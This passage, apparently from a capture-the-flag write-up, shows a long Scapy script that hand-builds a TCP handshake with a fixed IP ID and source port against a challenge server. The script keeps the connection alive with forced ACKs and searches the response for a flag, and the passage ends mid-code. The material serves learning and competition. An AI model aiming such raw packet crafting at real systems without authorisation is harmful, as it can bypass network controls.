class="line">     options   = []</span><br><span class="line"></span><br><span class="line">[*] HTTP data: b<span class="string">&#x27;GET / HTTP/1.1\r\nHost: 137.184.230.90:8080\r\nConnection: close\r\n\r\n&#x27;</span></span><br><span class="line">[*] Sending HTTP request...</span><br><span class="line">.</span><br><span class="line">Sent 1 packets.</span><br><span class="line">[*] Sniffing <span class="keyword">for</span> HTTP response packets...</span><br><span class="line">[+] Captured 16 response packets:</span><br><span class="line"></span><br><span class="line">--- Packet 1 ---</span><br><span class="line"></span><br><span class="line">--- Packet 2 ---</span><br><span class="line">[+] Raw data (1072 bytes):</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 28 May 2025 12:06:22 GMT</span><br><span class="line">Server: Apache/2.4.63 (Unix)</span><br><span class="line">Last-Modified: Fri, 23 May 2025 14:07:48 GMT</span><br><span class="line">ETag: <span class="string">&quot;7b03-635ce1f7bb500&quot;</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 31491</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui <span class="keyword">in</span> ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolor</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Despite establishing the connection, I didn’t receive the flag on the first attempt. I noticed that I was only receiving 5360 bytes, whereas the Content-Length header indicated 31491 bytes (~31.5 KB). This suggested the connection was getting terminated too early.</p><p>To address this, I modified the script to continuously send ACK packets to keep the TCP connection alive until the full content was received.</p><p>Modified Script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;137.184.230.90&quot;</span></span><br><span class="line">port = <span class="number">8080</span></span><br><span class="line">ipid = <span class="number">1337</span></span><br><span class="line">src_port = <span class="number">12345</span></span><br><span class="line">seq = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Using IPID: <span class="subst">&#123;ipid&#125;</span>, Source Port: <span class="subst">&#123;src_port&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: SYN</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending SYN...&quot;</span>)</span><br><span class="line">ip_syn = IP(dst=target, <span class="built_in">id</span>=ipid)</span><br><span class="line">syn = TCP(sport=src_port, dport=port, flags=<span class="string">&quot;S&quot;</span>, seq=seq)</span><br><span class="line"></span><br><span class="line">synack = sr1(ip_syn/syn, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> synack:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] No response to SYN.&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Received SYN-ACK&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> synack[TCP].flags != <span class="string">&#x27;SA&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Expected SYN-ACK, got something else.&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate proper sequence numbers</span></span><br><span class="line">ack_seq = seq + <span class="number">1</span></span><br><span class="line">ack_ack = synack.seq + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] ACK seq: <span class="subst">&#123;ack_seq&#125;</span>, ACK ack: <span class="subst">&#123;ack_ack&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: ACK</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending ACK...&quot;</span>)</span><br><span class="line">ip_ack = IP(dst=target, <span class="built_in">id</span>=ipid)</span><br><span class="line">ack = TCP(sport=src_port, dport=port, flags=<span class="string">&quot;A&quot;</span>, seq=ack_seq, ack=ack_ack)</span><br><span class="line"></span><br><span class="line">response_to_ack = sr1(ip_ack/ack, timeout=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> response_to_ack:</span><br><span class="line">    <span class="keyword">if</span> response_to_ack.haslayer(TCP) <span class="keyword">and</span> response_to_ack[TCP].flags &amp; <span class="number">0x04</span>:  <span class="comment"># RST</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Got RST in response to ACK - connection rejected&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] No immediate response to ACK - this is good!&quot;</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: HTTP GET</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending HTTP GET...&quot;</span>)</span><br><span class="line">ip_http = IP(dst=target, <span class="built_in">id</span>=ipid)</span><br><span class="line">http_data = <span class="string">b&quot;GET / HTTP/1.1\r\nHost: 137.184.230.90:8080\r\nConnection: close\r\n\r\n&quot;</span></span><br><span class="line">psh = TCP(sport=src_port, dport=port, flags=<span class="string">&quot;PA&quot;</span>, seq=ack_seq, ack=ack_ack)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending HTTP request...&quot;</span>)</span><br><span class="line">send(ip_http/psh/http_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Global variables for TCP state management</span></span><br><span class="line">current_ack = ack_ack</span><br><span class="line">my_seq = ack_seq + <span class="built_in">len</span>(http_data)</span><br><span class="line">received_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">content_length = <span class="literal">None</span></span><br><span class="line">headers_complete = <span class="literal">False</span></span><br><span class="line">capture_active = <span class="literal">True</span></span><br><span class="line">packets_received = <span class="number">0</span></span><br><span class="line">tcp_segments = &#123;&#125;  <span class="comment"># Store out-of-order segments</span></span><br><span class="line">expected_seq = ack_ack</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_ack</span>(<span class="params">ack_num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Send an ACK packet to acknowledge received data&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> my_seq</span><br><span class="line">    ack_pkt = IP(dst=target, <span class="built_in">id</span>=ipid) / TCP(</span><br><span class="line">        sport=src_port, </span><br><span class="line">        dport=port, </span><br><span class="line">        flags=<span class="string">&quot;A&quot;</span>, </span><br><span class="line">        seq=my_seq, </span><br><span class="line">        ack=ack_num,</span><br><span class="line">        window=<span class="number">65535</span>  <span class="comment"># Large window size</span></span><br><span class="line">    )</span><br><span class="line">    send(ack_pkt, verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Sent ACK: seq=<span class="subst">&#123;my_seq&#125;</span>, ack=<span class="subst">&#123;ack_num&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_response_packet</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Process incoming TCP packets and send ACKs&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> current_ack, received_data, content_length, headers_complete, capture_active, packets_received, tcp_segments, expected_seq</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pkt.haslayer(IP) <span class="keyword">and</span> pkt.haslayer(TCP) <span class="keyword">and</span> </span><br><span class="line">        pkt[IP].src == target <span class="keyword">and</span> pkt[TCP].sport == port <span class="keyword">and</span> </span><br><span class="line">        pkt[TCP].dport == src_port):</span><br><span class="line">        </span><br><span class="line">        packets_received += <span class="number">1</span></span><br><span class="line">        tcp_layer = pkt[TCP]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Check for data</span></span><br><span class="line">        <span class="keyword">if</span> pkt.haslayer(Raw):</span><br><span class="line">            data = pkt[Raw].load</span><br><span class="line">            tcp_seq = tcp_layer.seq</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Packet <span class="subst">&#123;packets_received&#125;</span>: seq=<span class="subst">&#123;tcp_seq&#125;</span>, len=<span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>, expected_seq=<span class="subst">&#123;expected_seq&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Store the segment regardless of order</span></span><br><span class="line">            tcp_segments[tcp_seq] = data</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Always send ACK for received data to keep connection alive</span></span><br><span class="line">            ack_for_this_packet = tcp_seq + <span class="built_in">len</span>(data)</span><br><span class="line">            send_ack(ack_for_this_packet)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Try to reassemble consecutive data</span></span><br><span class="line">            reassemble_data()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Check if we have all data</span></span><br><span class="line">            <span class="keyword">if</span> headers_complete <span class="keyword">and</span> content_length:</span><br><span class="line">                headers_end = received_data.find(<span class="string">b&#x27;\r\n\r\n&#x27;</span>) + <span class="number">4</span></span><br><span class="line">                body_length = <span class="built_in">len</span>(received_data) - headers_end</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Body progress: <span class="subst">&#123;body_length&#125;</span>/<span class="subst">&#123;content_length&#125;</span> bytes (<span class="subst">&#123;body_length/content_length*<span class="number">100</span>:<span class="number">.1</span>f&#125;</span>%)&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> body_length &gt;= content_length:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] All data received!&quot;</span>)</span><br><span class="line">                    capture_active = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Handle connection close - but don&#x27;t stop immediately, try to get more data</span></span><br><span class="line">        <span class="keyword">if</span> tcp_layer.flags &amp; <span class="number">0x01</span>:  <span class="comment"># FIN</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] FIN received - server wants to close connection&quot;</span>)</span><br><span class="line">            <span class="comment"># Send ACK for FIN but don&#x27;t close immediately</span></span><br><span class="line">            send_ack(tcp_layer.seq + <span class="number">1</span>)</span><br><span class="line">            <span class="comment"># Don&#x27;t send our own FIN yet, try to get more data</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Continuing to wait for more data...&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> tcp_layer.flags &amp; <span class="number">0x04</span>:  <span class="comment"># RST</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] RST received - connection reset&quot;</span>)</span><br><span class="line">            capture_active = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reassemble_data</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Reassemble TCP segments in order&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> received_data, expected_seq, headers_complete, content_length</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Try to find consecutive segments starting from expected_seq</span></span><br><span class="line">    temp_data = received_data</span><br><span class="line">    current_expected = expected_seq</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> current_expected <span class="keyword">in</span> tcp_segments:</span><br><span class="line">        segment_data = tcp_segments[current_expected]</span><br><span class="line">        temp_data += segment_data</span><br><span class="line">        current_expected += <span class="built_in">len</span>(segment_data)</span><br><span class="line">        <span class="comment"># Remove processed segment</span></span><br><span class="line">        <span class="keyword">del</span> tcp_segments[current_expected - <span class="built_in">len</span>(segment_data)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Update global state</span></span><br><span class="line">    received_data = temp_data</span><br><span class="line">    expected_seq = current_expected</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Parse headers if not done yet</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> headers_complete <span class="keyword">and</span> <span class="string">b&#x27;\r\n\r\n&#x27;</span> <span class="keyword">in</span> received_data:</span><br><span class="line">        headers_end = received_data.find(<span class="string">b&#x27;\r\n\r\n&#x27;</span>) + <span class="number">4</span></span><br><span class="line">        headers = received_data[:headers_end]</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Headers parsed!&quot;</span>)</span><br><span class="line">        headers_str = headers.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">        content_match = re.search(<span class="string">r&#x27;Content-Length:\s*(\d+)&#x27;</span>, headers_str, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> content_match:</span><br><span class="line">            content_length = <span class="built_in">int</span>(content_match.group(<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Content-Length: <span class="subst">&#123;content_length&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        headers_complete = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start active packet capture with response processing</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Starting active TCP capture...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Will send ACKs for received data to keep connection alive&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use a custom sniffing approach with timeout and active ACK sending</span></span><br><span class="line">start_time = time.time()</span><br><span class="line">timeout_duration = <span class="number">180</span>  <span class="comment"># 3 minutes timeout</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff packets and process them</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    packets = sniff(</span><br><span class="line">        <span class="built_in">filter</span>=<span class="string">f&quot;host <span class="subst">&#123;target&#125;</span> and port <span class="subst">&#123;port&#125;</span>&quot;</span>,</span><br><span class="line">        stop_filter=process_response_packet,</span><br><span class="line">        timeout=timeout_duration</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] Interrupted by user&quot;</span>)</span><br><span class="line">    capture_active = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to get any remaining out-of-order packets</span></span><br><span class="line"><span class="keyword">if</span> tcp_segments:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Processing <span class="subst">&#123;<span class="built_in">len</span>(tcp_segments)&#125;</span> out-of-order segments...&quot;</span>)</span><br><span class="line">    reassemble_data()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[+] Capture completed!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Total packets received: <span class="subst">&#123;packets_received&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Total data received: <span class="subst">&#123;<span class="built_in">len</span>(received_data)&#125;</span> bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content_length:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Expected: <span class="subst">&#123;content_length&#125;</span> bytes&quot;</span>)</span><br><span class="line">    headers_end = received_data.find(<span class="string">b&#x27;\r\n\r\n&#x27;</span>) + <span class="number">4</span></span><br><span class="line">    body_length = <span class="built_in">len</span>(received_data) - headers_end</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Body received: <span class="subst">&#123;body_length&#125;</span> bytes (<span class="subst">&#123;body_length/content_length*<span class="number">100</span>:<span class="number">.1</span>f&#125;</span>%)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save all received data to file</span></span><br><span class="line">timestamp = <span class="built_in">int</span>(time.time())</span><br><span class="line">filename = <span class="string">f&quot;http_response_<span class="subst">&#123;timestamp&#125;</span>.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[*] Saving complete response to <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        full_text = received_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">        f.write(full_text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Saved <span class="subst">&#123;<span class="built_in">len</span>(full_text)&#125;</span> characters to <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Error saving as text: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># If we didn&#x27;t get all data, try one more aggressive capture</span></span><br><span class="line"><span class="keyword">if</span> content_length <span class="keyword">and</span> <span class="built_in">len</span>(received_data) - received_data.find(<span class="string">b&#x27;\r\n\r\n&#x27;</span>) - <span class="number">4</span> &lt; content_length:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Missing data detected. Trying additional capture...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Making another request to get remaining data...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Make another request (servers sometimes have issues with single requests)</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    send(ip_http/psh/http_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Capture for a shorter time</span></span><br><span class="line">    additional_packets = sniff(</span><br><span class="line">        <span class="built_in">filter</span>=<span class="string">f&quot;src host <span class="subst">&#123;target&#125;</span> and src port <span class="subst">&#123;port&#125;</span>&quot;</span>,</span><br><span class="line">        timeout=<span class="number">30</span>,</span><br><span class="line">        count=<span class="number">50</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Captured <span class="subst">&#123;<span class="built_in">len</span>(additional_packets)&#125;</span> additional packets&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Process additional packets</span></span><br><span class="line">    <span class="keyword">for</span> pkt <span class="keyword">in</span> additional_packets:</span><br><span class="line">        <span class="keyword">if</span> pkt.haslayer(Raw):</span><br><span class="line">            <span class="comment"># This is a simple append - in production you&#x27;d want proper TCP reassembly</span></span><br><span class="line">            additional_data = pkt[Raw].load</span><br><span class="line">            <span class="comment"># Only add if it looks like new data</span></span><br><span class="line">            <span class="keyword">if</span> additional_data <span class="keyword">not</span> <span class="keyword">in</span> received_data:</span><br><span class="line">                received_data += additional_data</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Added <span class="subst">&#123;<span class="built_in">len</span>(additional_data)&#125;</span> bytes of additional data&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Save updated data</span></span><br><span class="line">    updated_filename = <span class="string">f&quot;http_response_updated_<span class="subst">&#123;timestamp&#125;</span>.txt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(updated_filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            full_text = received_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">            f.write(full_text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Saved updated response (<span class="subst">&#123;<span class="built_in">len</span>(full_text)&#125;</span> chars) to <span class="subst">&#123;updated_filename&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] Error saving updated text: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Process the complete response</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;\r\n\r\n&#x27;</span> <span class="keyword">in</span> received_data:</span><br><span class="line">    headers_end = received_data.find(<span class="string">b&#x27;\r\n\r\n&#x27;</span>) + <span class="number">4</span></span><br><span class="line">    headers = received_data[:headers_end]</span><br><span class="line">    body = received_data[headers_end:]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+] HTTP Headers:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(headers.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] HTTP Response Body (<span class="subst">&#123;<span class="built_in">len</span>(body)&#125;</span> bytes):&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        body_text = body.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Enhanced flag detection</span></span><br><span class="line">        flag_patterns = [</span><br><span class="line">            <span class="string">r&#x27;flag\&#123;[^&#125;]+\&#125;&#x27;</span>,</span><br><span class="line">            <span class="string">r&#x27;FLAG\&#123;[^&#125;]+\&#125;&#x27;</span></span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">        flags_found = []</span><br><span class="line">        <span class="keyword">for</span> pattern <span class="keyword">in</span> flag_patterns:</span><br><span class="line">            matches = re.findall(pattern, body_text, re.IGNORECASE)</span><br><span class="line">            